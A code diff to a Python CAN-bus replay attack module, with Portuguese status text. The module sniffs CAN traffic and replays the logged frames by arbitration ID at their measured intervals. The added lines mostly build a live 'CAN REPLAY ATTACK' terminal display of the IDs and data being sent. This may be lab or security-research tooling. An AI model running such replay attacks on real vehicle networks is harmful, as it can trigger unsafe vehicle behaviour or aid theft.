@@ -52,7 +52,15 @@ def main():
     message_bank = {}
     print("starting replay_attack_module")
     try:
-        capture_traffic(duration=10)
+        capture_traffic(bus,duration=10)
+        print(" SNIFFING FINALIZADO!")
+        replay_state = create_replay_state(message_bank, average_intervals)
+        sent_count = 0
+        print("\033[2J\033[H", end="", flush=True)
+        print("=" * 50)
+        print("             CAN REPLAY ATTACK")
+        print("=" * 50)
+        print("Aguardando primeira transmissão...")
         df = pd.read_csv(LOG_FILE)
         grouped = df.groupby("arbitration_id")
         for can_id, group in grouped:
@@ -73,6 +81,20 @@ def main():
                     
                     bus.send(msg)
 
+                    sent_count += 1
+
+                    print("\033[H", end="")
+
+                    print("=" * 50)
+                    print("             CAN REPLAY ATTACK")
+                    print("=" * 50)
+                    print(f"Status:          ATACANDO")
+                    print(f"Mensagens:       {sent_count}")
+                    print(f"CAN ID enviado:  0x{can_id:03X}")
+                    print(f"Dados enviados:  {msg.data.hex(' ').upper()}")
+                    print(f"DLC:             {msg.dlc}")
+                    print("=" * 50, flush=True)
+                    
                     state["next_send"] += state["interval"]
                     state["index"] += 1
 
